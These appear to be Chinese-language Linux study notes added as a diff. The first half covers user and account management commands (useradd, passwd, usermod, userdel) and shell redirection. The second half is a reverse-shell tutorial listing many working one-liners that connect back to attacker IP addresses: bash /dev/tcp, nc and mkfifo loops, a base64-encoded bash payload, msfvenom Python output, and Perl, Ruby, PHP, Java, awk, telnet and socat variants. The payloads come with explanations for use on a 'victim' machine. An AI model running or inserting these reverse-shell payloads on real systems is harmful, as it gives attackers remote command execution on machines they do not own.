+drwxr-xr-x. 3 root    root       23 6月  11 12:58 centos_64
+
+关于减号 – 的用途:
+在管线命令当中，常常会使用到前一个命令的 stdout 作为这次的 stdin，某些命令需要用到文件名 (例如 tar) 来进行处理时，该 stdin 与 stdout 可以利用减号 "-" 来替代， 举例来说：
+[root@localhost tmp]# tar -cvf - /home | tar -xvf -                 #-:第一个-：代表结果输出到stdout,第二个-：代表前一个命令的stdout（tar命令压缩用法：tar -czvf home.tar.gz /home）
+[root@localhost tmp]# ls -l
+总用量 36
+drwxr-xr-x. 10 root root  4096 8月  15 13:34 home
+这个例子是说：我们将 /home 里面的文件打包，但打包的数据不是记录到文件，而是传送到 stdout； 经过管道后，将 tar -cvf - /home 传送给后面的 tar -xvf - 。后面的这个 - 则是取用前一个命令的 stdout， 因此，我们就不需要使用 file 了。
+
+
+账户管理之用户管理
+
+查看用户的UID和GID：
+查看 /etc/passwd文件，第一字段是用户名，第三和第四字段，分别是用户的UID和GID
+0 ：系统管理员：当 UID 是 0 时，代表这个账号是『系统管理员』！ 所以当你要让其他的账号名称也具有 root 的权限时，将该账号的 UID 改为 0 即可。 这也就是说，一部系统上面的系统管理员不见得只有 root 喔！ 不过，很不建议有多个账号的 UID 是 0。
+1-499：系统账号：保留给系统使用的 ID，其实除了 0 之外，其他的 UID 权限与特性并没有不一样。默认 500 以下的数字让给系统作为保留账号只是一个习惯，由于系统上面启动的服务希望使用较小的权限去运行，因此不希望使用 root 的身份去运行这些服务， 所以我们就得要提供这些运行中程序的拥有者账号才行。这些系统账号通常是不可登陆的，比如mysql用户。
+500-65535：可登陆账号：给一般使用者用的。
+
+添加用户 -useradd
+
+用法： useradd [参数] [待添加用户名]
+
+参数：
+-u：指定userid，一般大于500；
+-d：指定home目录。
+
+其实在CentOS中，当我们敲 useradd 用户名 的时候，默认会帮我们完成以下几个动作：
+
+1、在 /etc/passwd 里面创建一行与账号相关的数据，包括创建 UID/GID/家目录等；
+2、在 /etc/shadow 里面将此账号的口令相关参数填入，但是尚未有口令；
+3、在 /etc/group 里面加入一个与账号名称一模一样的组名；
+4、在 /home 底下创建一个与账号同名的目录作为用户家目录，且权限为 700
+
+例子：
+[root@localhost ~]# useradd -d /home/guoguo guoguo             #-d：指定home目录，用户名：guoguo
+[root@localhost ~]# cat /etc/passwd | grep guoguo              #创建用户后，查看/etc/passwd
+guoguo:x:1004:1004::/home/guoguo:/bin/bash                      #可以看到，用户名，uid,gid,家目录
+[root@localhost ~]# ls -l /home | grep guoguo
+drwx------. 2 guoguo  guoguo     62 8月  15 17:17 guoguo
+[root@localhost ~]# cat /etc/shadow | grep guoguo              #创建用户后，查看/etc/shadow
+guoguo:!!:18854:0:99999:7:::
+[root@localhost ~]# passwd guoguo
+更改用户 guoguo 的密码 。
+新的 密码：
+无效的密码： 密码少于 8 个字符
+重新输入新的 密码：
+passwd：所有的身份验证令牌已经成功更新。
+[root@localhost ~]# cat /etc/shadow | grep guoguo             #创建密码后，查看/etc/shadow
+guoguo:$6$90fWUr1e$t7XJMe4kvO3UOigSzbjXOZsp97RnzpHTkzNzmjGP9bPYBmlUcUuD9Og7feGXMjmbmMgL40HKm.aQY1NdeADA11:18854:0:99999:7:::              #可以看到多了个密钥信息
+[root@localhost ~]# cat /etc/group  |grep guoguo             #查看/etc/group
+guoguo:x:1004:
+[root@localhost ~]# ls -l /home/ | grep guoguo               #查看/home/guoguo目录 权限
+drwx------. 2 guoguo  guoguo     62 8月  15 17:37 guoguo     #权限为700
+
+查看useradd 的默认值：useradd -D ：
+[root@localhost ~]# useradd -D
+GROUP=100                                         #默认的群组
+HOME=/home											#默认家目录
+INACTIVE=-1                                       #代表密码失效日期（shadow内容的第七字段），-1：代表口令永远不会失效
+EXPIRE=												#账号失效日（shadow内容的第八字段内容）
+SHELL=/bin/bash										#默认的shell
+SKEL=/etc/skel									  #用户家目录的内容数据参考目录
+CREATE_MAIL_SPOOL=yes								#是否主动帮助用户创建邮箱
+
+
+
+用户设置密码之passwd命令：
+[root@localhost ~]# passwd guoguo               					#passwd命令为用户guoguo创建密码
+更改用户 guoguo 的密码 。
+新的 密码：																						#输入密码
+无效的密码： 密码少于 8 个字符
+重新输入新的 密码：																			#再一次输入密码
+passwd：所有的身份验证令牌已经成功更新。
+[root@localhost ~]#
+
+修改密码
+[root@localhost ~]# echo "abc" | passwd --stdin guoguo          #修改guoguo用户密码为abc
+更改用户 guoguo 的密码 。
+passwd：所有的身份验证令牌已经成功更新。
+[root@localhost ~]#
+
+
+[root@localhost ~]# passwd -l guoguo                    #-l:锁定用户guoguo，就不能登陆了
+锁定用户 guoguo 的密码 。
+passwd: 操作成功
+[root@localhost ~]# passwd -u guoguo                    #-u:解锁用户guoguo
+解锁用户 guoguo 的密码。
+passwd: 操作成功
+[root@localhost ~]#
+
+
+修改用户之 usermod
+
+      如果新建用户之后，需要更改用户的配置，我们可以用usermod命令
+
+      用法：usermod 参数 用户名
+
+参数：
+
+      -c  ：后面接账号的说明，即 /etc/passwd 第五栏的说明栏，可以加入一些账号的说明。
+
+      -d  ：后面接账号的家目录，即修改 /etc/passwd 的第六栏；
+
+      -e  ：后面接日期，格式是 YYYY-MM-DD 也就是在 /etc/shadow 内的第八个字段数据啦！
+
+      -f  ：后面接天数，为 shadow 的第七字段。
+
+      -g  ：后面接初始群组，修改 /etc/passwd 的第四个字段，亦即是 GID 的字段！
+
+      -G  ：后面接次要群组，修改这个使用者能够支持的群组，修改的是 /etc/group
+
+      -a  ：与 -G 合用，可『添加次要群组的支持』而非『配置』！
+
+      -l  ：后面接账号名称。亦即是修改账号名称， /etc/passwd 的第一栏！
+
+      -s  ：后面接 Shell 的实际文件，例如 /bin/bash 或 /bin/csh 等等。
+
+      -u  ：后面接 UID 数字啦！即 /etc/passwd 第三栏的数据；
+
+      -L  ：暂时将用户的口令冻结，让他无法登陆。其实仅改 /etc/shadow 的口令栏。
+
+      -U  ：将 /etc/shadow 口令栏的 ! 拿掉，解除锁定！
+
+
+例子：添加用户说明：usermod -c "welcome to heetian.com" guoguo
+[root@localhost ~]# usermod -c "welcome to hetian.com" guoguo                  #-c:添加用户说明："welcome to heetian.com"
+[root@localhost ~]# cat /etc/passwd | grep guoguo
+guoguo:x:1004:1004:welcome to hetian.com:/home/guoguo:/bin/bash
+[root@localhost ~]#
+
+
+删除账号之 userdel
+
+      用法：userdel -r username
+
+      参数：-r  ：连同 家目录一起删除！
+
+
+例子：删除 guoguo 用户：userdel -r guoguo
+[root@localhost ~]# userdel -r guoguo                     #-r:连同家目录一起删除
+[root@localhost ~]# ls -l /home | grep guoguo             #可以看到为空
+[root@localhost ~]#
+[root@localhost ~]# useradd guoguo
+[root@localhost ~]# ls -l /home | grep guoguo
+drwx------. 2 guoguo  guoguo     62 8月  15 17:35 guoguo
+[root@localhost ~]# userdel guoguo                        #不用-r参数，家目录没有删除
+[root@localhost ~]# ls -l /home | grep guoguo             #可以看到家目录：/home/guoguo
+drwx------. 2    1004    1004    62 8月  15 17:35 guoguo
+[root@localhost ~]# useradd guoguo                        #再次创建用户就会报错：文件以存在
+useradd：警告：此主目录已经存在。
+不从 skel 目录里向其中复制任何文件。
+正在创建信箱文件: 文件已存在
+[root@localhost ~]# userdel -r guoguo                     #userdel -r guoguo：使用-r：再次删除
+[root@localhost ~]# useradd guoguo                        #再次创建用户成功
+[root@localhost ~]#
+
+
+结束！
+
+应用：
+例子：bash -i >& /dev/tcp/192.168.1.1/9090 0>&1
+bash -i :意为创建一个交互式的bash shell
+/dev/tcp/192.168.1.1/9090 :这是一个特殊文件，它会建立一个连接到192.168.1.1:9090的socket
+
+
+
+Linux反弹shell（一）文件描述符与重定向
+参考：https://xz.aliyun.com/t/2548
+
+标准输入standard input 0 （默认设备键盘）
+标准输出standard output 1（默认设备显示器）
+错误输出：error output 2（默认设备显示器）
+
+1.输入重定向
+格式： [n]< word （注意[n]与<之间没有空格）
+[root@localhost zx]# cat 0< file             #第一种写法
+hello
+[root@localhost zx]# cat < file				#第二种写法
+hello
+[root@localhost zx]# 0< file cat			#第三种写法
+hello
+[root@localhost zx]# < file cat    			#第四种写法
+hello
+解释: 解析器解析到 "<" 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取内容的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取内容了
+
+2.输出重定向
+格式： [n]> word
+[root@localhost zx]# echo hello > file    #第一种写法
+[root@localhost zx]# cat file
+hello
+[root@localhost zx]# echo world 1> file   #第二种写法
+[root@localhost zx]# cat file
+world
+[root@localhost zx]# > file  echo hello   #第三种写法
+[root@localhost zx]# cat file
+hello
+[root@localhost zx]# 1> file echo world   #第四种写法
+[root@localhost zx]# cat file   
+world
+[root@localhost zx]#
+
+
+3.标准输出与标准错误输出重定向
+
+格式： &> word 或 >& word 
+
+说明:将标准输出与标准错误输出都定向到word代表的文件,两种格式意义完全相同,这两种格式完全等价与：> word 2>&1 (2>&1 是将标准错误输出复制到标准输出，&是为了区分文件1和文件描述符1)
+
+
+[root@localhost zx]# mkdir &> file
+[root@localhost zx]# cat file
+mkdir: 缺少操作数
+Try 'mkdir --help' for more information.
+[root@localhost zx]# ls &> file
+[root@localhost zx]# cat file
+file
+[root@localhost zx]#
+
+
+4.文件描述符的复制
+格式： [n]<&[m] / [n]>&[m] (这里所有字符之间不要有空格)
+
+说明：
+1）这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开
+因此 0<&1 和 0>&1 是完全等价的（读/写方式打开对其没有任何影响）
+
+2）这里的& 目的是为了区分数字名字的文件和文件描述符，如果没有& 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符
+
+之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子
+
+(1)cmd > file 2>&1
+stdin  0						/dev/tty0	(原本：stdin  0)
+								/dev/tty0	(原本：stdin  1)
+								/dev/tty0	(原本：stdin  2)
+stdout 1、stderr 2				file
+
+
+
+
+
+(2)cmd 2>&1 >file
+1.首先解析器解析到 2>&1
+stdin  0						/dev/tty0	(原本：stdin  0)
+stdout 1、stderr 2				/dev/tty0	(原本：stdin  1)
+								/dev/tty0	(原本：stdin  2)
+
+2.解析器再向后解析到 ">"
+
+stdin  0 						/dev/tty0  (原本：stdin  0)
+stdin  2						/dev/tty0  (原本：stdin  1)
+								/dev/tty0  (原本：stdin  2)
+stdin  1						file
+
+
+5.exec 绑定重定向
+格式：exec [n] </> file/[n]
+
+上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令                 
+[root@localhost zx]# exec 4<>abc			#将4与abc绑定
+[root@localhost zx]# ls						#可以看到多了一个abc文件 
+abc  file
+
+[root@localhost zx]# echo hello >&4   		#此时4代表了绑定的abc，stdout 输出到4里，只能使用一次
+[root@localhost zx]# cat abc				#查看abc内容
+hello
+[root@localhost zx]# 
+
+
+[root@localhost zx]# exec 5<>abcd       	#将5与abcd绑定
+[root@localhost zx]# ls
+abc  abcd  file
+[root@localhost zx]# cat abcd
+[root@localhost zx]# echo nihao > abcd
+[root@localhost zx]# cat abcd
+nihao
+[root@localhost zx]# cat <&5               #此时5代表了绑定的abcd，stdin定向到5上 ,只能使用一次
+nihao
+[root@localhost zx]#
+
+
+总结
+文件描述符和重定向的作用巨大，很好的体现出了Linux中一切皆文件的特性，在反弹shell建立交互通道的过程中也起到了至关重要的作用。
+
+
+Linux 反弹shell（二）反弹shell的本质
+
+shell的输出重定向到攻击机上
+bash -i > /dev/tcp/192.168.146.129/2333
+
+shell的输入重定向到攻击机上
+bash -i < /dev/tcp/192.168.146.129/2333
+
+shell的输出和输入重定向到攻击机上
+bash -i > /dev/tcp/192.168.146.129/2333 0>&1
+
+最终：
+shell的输出、输入和错误重定向到攻击机上
+bash -i > /dev/tcp/192.168.146.129/2333 0>&1 2>&1或者
+bash -i >& /dev/tcp/192.168.146.129/2333 0>&1
+
+方法一：
+bash -i>& /dev/tcp/192.168.146.129/2333 0>&1        #打开方式为写，文件描述符0复制到1
+或
+bash -i>& /dev/tcp/192.168.146.129/2333 0<&1         #打开方式为读，文件描述符0复制到1
+这里的唯一区别就是 0>&1 和 0<&1 ，其实就是打开方式的不同
+
+方法二：
+bash -i >& /dev/tcp/192.168.146.129/2333 <&2      #文件描述符0复制到2
+或
+bash -i >& /dev/tcp/192.168.146.129/2333 0<&2     #文件描述符0复制到2
+
+方法三：
+exec 5<>/dev/tcp/192.168.146.129/2333;cat <&5|while read line;do $line >&5 2>&1;done  #接收输入，开了个管道stdout到stdin
+
+解释：
+知识点1：文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是读写方式
+知识点2：
+command|while read line do .....done
+这个是一个非常经典的句子，它的原句是这样的
+while read line
+do
+       …
+done < file
+从文件中依次读取每一行，将其赋值给 line 变量，之后再在循环中对line进行操作
+而现在我们不是从file文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5
+
+举一反三：
+exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196                 #
+或
+exec 196<>/dev/tcp/172.31.50.57/4444;<&196 >&196 2>&196 bash -i
+
+总结：
+反弹shell思路：bash/sh将要执行，将要执行之前通过重定向将stdin、stdout、stderr指明位置：系统先执行重定向符，再根据相应的stdin,stdout,stderr,然后执行bash/sh
+
+扩展：
+方法四：利用nc
+yum install nmap-ncat
+nc -e /bin/sh 192.168.146.129 2333
+
+
+但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.146.129 2333 >/tmp/f
+
+解释：mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc传到该管道，由此形成了一个回路
+
+类似的命令：
+mknod backpipe p; nc 192.168.146.129 2333 0<backpipe | /bin/bash 1>backpipe 2>backpipe
+
+补充：
+1、bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzEuNTAuNTcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
+
+解释：
+bash -c只是在当前漏洞环境需要，依靠漏洞在这个应用中执行任意命令时需要，如果本身就在bash中的话是不用写的
+
+例子：
+若用-c参数，则bash从字符串中读入命令
+leixiao@LAPTOP-H4MNA5DT:~$ bash -c "echo hello"
+hello
+
+
+2、{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzEuNTAuNTcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
+
+解释：
+{bash,-i}：相当于开了一个新的shell 去执行所输入的内容(stdin)，
+例子：
+[root@localhost zx]# echo "pwd" |{bash,-i}       	    #{bash,-i}的使用
+[root@localhost zx]# pwd                                #新起了一行，并执行pwd   （pwd来自stdin）
+/home/zx
+[root@localhost zx]# exit								#新起了一行，并执行exit(默认执行)
+[root@localhost zx]#
+
+
+方法五：利用msfvenom
+msf工具:
+搜索payload:
+msfvenom -l payloads | grep 'cmd/unix/reverse'
+
+使用python版：cmd/unix/reverse_python生成payload:
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p cmd/unix/reverse_python lhost=175.24.115.4 lport=1234                  130 ⨯
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 597 bytes
+python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgICAgICAgICA7ICAgaG9zdD0iMTc1LjI0LjExNS40IiAgICAgICAgIDsgICBwb3J0PTEyMzQgICAgICAgICA7ICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICAgOyAgIHMuY29ubmVjdCgoaG9zdCwgICAgICAgcG9ydCkpICAgICAgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAgMCkgICAgICAgICA7ICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgICAxKSAgICAgICAgIDsgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgIDIpICAgICAgICAgOyAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
+
+然后在害者机器执行生成的paylaod，如下:
+python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgICAgICAgICA7ICAgaG9zdD0iMTc1LjI0LjExNS40IiAgICAgICAgIDsgICBwb3J0PTEyMzQgICAgICAgICA7ICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICAgOyAgIHMuY29ubmVjdCgoaG9zdCwgICAgICAgcG9ydCkpICAgICAgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAgMCkgICAgICAgICA7ICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgICAxKSAgICAgICAgIDsgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgIDIpICAgICAgICAgOyAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
+
+
+
+方法六：具体语言实现
+
+1)python语言
+python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('175.24.115.4',1234)) ;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
+
+我们分析下这段脚本的内容
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.105',123))   建立socket连接
+
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); 使用了os模块的dup2函数和socket模块的fileno函数
+
+fileno函数：返回套接字的文件描述符fd，如果从shell中运行一个进程，默认会有3个文件描述符存在(0、１、2),0与进程的标准输入相关联，１与进程的标准输出相关联，2与进程的标准错误输出相关联。
+
+Dup2函数：dup2传入两个文件描述符，f1和f2（f1是必须存在的），如果f2存在，就关闭f2，然后将f1代表的那个文件强行复制给f2，f2这个文件描述符不会发生变化，但是fd2指向的文件就变成了f1指向的文件。这个函数最大的作用是重定向
+
+这句的代码的作用就是将fd2指向s.fileno(),而fileno（）返回的是建立socket连接返回的文件描述符fd，也就是将将标准输入、标准输出、标准错误输出重定向到远程
+
+p=subprocess.call(['/bin/bash','-i'])  使用subprocess在本地开启子进程，同时传入“i“使得bash以交互模式启动
+
+经过以上代码的功能整合，在主机A就相当于接收到了主机B的shell
+
+其他语言的实现也是同样的道理，关键的点都在于建立socket连接以及之后的交互实现
+
+2）perl语言的
+perl -e 'use Socket;$i="175.24.115.4";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+3）ruby语言的
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("175.24.115.4","123");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+4）php语言
+php -r '$sock=fsockopen("175.24.115.4",123);exec("/bin/bash -i 0>&3 1>&3 2>&3");' 
+
+
+5）java语言
+apt install default-jdk
+
+public class Revs {
+    /**
+    * @param args
+    * @throws Exception 
+    */
+public static void main(String[] args) throws Exception {
+        // TODO Auto-generated method stub
+        Runtime r = Runtime.getRuntime();
+        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+        Process p = r.exec(cmd);
+        p.waitFor();
+    }
+}
+}
+
+保存为Revs.java文件，编译执行，成功反弹shell。
+javac Revs.java 
+java Revs
+
+
+
+方法七：awk反弹
+awk 'BEGIN{s="/inet/tcp/0/175.24.115.4/123";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
+
+
+
+方法八：telnet反弹
+
+受害端：
+telnet 175.24.115.4 123 | /bin/bash | telnet 175.24.115.4 321
+攻击端：
+nc -lvvp 321
+nc -lvvp 123
+备注：需要在攻击主机上分别监听123和321端口，执行反弹shell命令后，在123终端输入命令，321查看命令执行后的结果。
+
+
+方法九：socat反弹
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:175.24.115.4:123
+
+
+
+
+
+
